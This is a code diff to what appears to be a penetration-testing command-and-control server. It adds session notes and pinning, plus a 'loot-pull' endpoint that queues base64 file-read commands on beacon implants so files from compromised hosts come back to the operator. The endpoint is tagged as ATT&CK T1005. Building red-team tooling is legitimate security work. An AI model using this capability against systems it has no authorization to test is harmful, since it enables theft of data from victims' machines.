@@ -213,10 +213,23 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
         sess = mgr.get(session_id)
         if sess is None:
             raise HTTPException(404, "no such session")
+        changed = []
         if "label" in body:
             sess.label = str(body["label"])[:80]
+            changed.append("label")
+        if "notes" in body:
+            # Free-form operator notes for the writeup ("how I got in here,
+            # what's interesting on this host"). Cap at 4 KiB so a paste of a
+            # huge dump doesn't bloat the shell_sessions row — the terminal
+            # scrollback is the right place for that.
+            sess.notes = str(body["notes"])[:4096]
+            changed.append("notes")
+        if "pinned" in body:
+            sess.pinned = bool(body["pinned"])
+            changed.append("pinned")
+        if changed:
             mgr._save(sess)
-            broker.publish({"type": "session", "event": "label", "id": sess.id})
+            broker.publish({"type": "session", "event": ",".join(changed), "id": sess.id})
         return sess.info()
 
     @app.get("/api/sessions/{session_id}/transcript")
@@ -621,7 +634,22 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
             raise HTTPException(400, "path required")
         if not sess.connected:
             raise HTTPException(409, "shell not connected")
-        out = await sess.run_and_capture(b"base64 " + shlex.quote(path).encode() + b" 2>/dev/null")
+        import re as _re
+        if path.startswith("~") and _re.fullmatch(r"~[A-Za-z0-9_./~-]*", path):
+            cmd = (f'sh -c "base64 {path} 2>/dev/null || '
+                   f'{{ test -e {path} && echo LOOT_ERR:permission_denied '
+                   f'|| echo LOOT_ERR:not_found; }}"')
+        else:
+            q = shlex.quote(path)
+            cmd = (f"base64 {q} 2>/dev/null || "
+                   f"{{ test -e {q} && echo LOOT_ERR:permission_denied "
+                   f"|| echo LOOT_ERR:not_found; }}")
+        out = await sess.run_and_capture(cmd.encode())
+        text = out.decode(errors="replace").strip()
+        if "LOOT_ERR:permission_denied" in text:
+            raise HTTPException(422, "permission denied")
+        if "LOOT_ERR:not_found" in text:
+            raise HTTPException(422, "file not found")
         cleaned = bytes(c for c in out if c not in b"\r\n \t")
         if not cleaned:
             raise HTTPException(422, "no data — file missing, unreadable, or base64 unavailable")
@@ -670,6 +698,71 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
         return {"ok": True, "saved": dest, "size": len(raw),
                 "artifact_id": art_id, "sha256": sha256,
                 "finding_id": finding_id or None}
+
+    @app.post("/api/sessions/{session_id}/loot-pull")
+    async def loot_pull(session_id: str, body: dict = Body(...),
+                        x_tester: str = Header(default="someone")):
+        """Unified file-pull → session-loot. For an interactive shell this
+        blocks on `run_and_capture` and returns the saved path immediately
+        (same effect as /download). For a beacon it queues a `base64 <path>`
+        task tagged kind='loot-pull' and returns the task_id — the next
+        /beacon/result the client posts is auto-recognized and the returned
+        base64 is decoded + saved to session-loot without needing the client
+        to attach a special `artifact` block. Lets the Loot menu offer file
+        grabs uniformly on both session types."""
+        import shlex
+        sess = mgr.get(session_id)
+        if sess is None:
+            raise HTTPException(404, "no such session")
+        path = str(body.get("path", "")).strip()
+        if not path:
+            raise HTTPException(400, "path required")
+        # Interactive shell: run it now via the /download machinery.
+        if sess.kind != "beacon":
+            # Just forward to the existing handler so we keep ONE code path
+            # for the synchronous flow (base64 + decode + save + oplog +
+            # artifact-link) rather than maintaining two copies.
+            return await download(session_id, {"path": path}, x_tester)
+        # Beacon: queue and return. The result handler at /beacon/result
+        # recognizes kind='loot-pull' and auto-saves.
+        from ...sessions.tasking import _mint_task_id
+        task_id = _mint_task_id()
+        # Two shapes:
+        #   - Absolute paths: `base64 <shlex-quoted-path> 2>/dev/null` — safe by
+        #     construction; stderr suppressed so an error message can't get
+        #     mistaken for the file's base64 output.
+        #   - `~`-prefixed paths: wrap in `sh -c "base64 <path>"` so the shell
+        #     expands `~` to the target user's home. Guard the path with a
+        #     conservative regex so a shell metacharacter can't slip through
+        #     into the sh -c string.
+        import re as _re
+        if path.startswith("~") and _re.fullmatch(r"~[A-Za-z0-9_./~-]*", path):
+            command = (f'sh -c "base64 {path} 2>/dev/null || '
+                       f'{{ test -e {path} && echo LOOT_ERR:permission_denied '
+                       f'|| echo LOOT_ERR:not_found; }}"')
+        else:
+            q = shlex.quote(path)
+            command = (f"base64 {q} 2>/dev/null || "
+                       f"{{ test -e {q} && echo LOOT_ERR:permission_denied "
+                       f"|| echo LOOT_ERR:not_found; }}")
+        try:
+            from ...core.store import Store
+            from .. import collab
+            with Store(db_path) as st:
+                collab.add_activity(st, x_tester, "session",
+                                    f"queued loot-pull on {sess.host_ip}: {path[:80]}"
+                                    + ("…" if len(path) > 80 else ""))
+                st.add_task(x_tester, session_id, sess.host_ip, command,
+                            task_id, kind="loot-pull",
+                            attack="T1005 Data from Local System")
+        except Exception:  # noqa: BLE001
+            pass
+        broker.publish({"type": "task", "event": "queued", "id": session_id,
+                        "task_id": task_id, "by": x_tester,
+                        "kind": "loot-pull", "path": path[:160]})
+        return {"status": "queued", "task_id": task_id, "path": path,
+                "host_ip": sess.host_ip,
+                "message": "queued — will save to session-loot on next beacon check-in"}
 
     @app.post("/api/sessions/{session_id}/upload")
     async def upload(session_id: str, body: dict = Body(...),
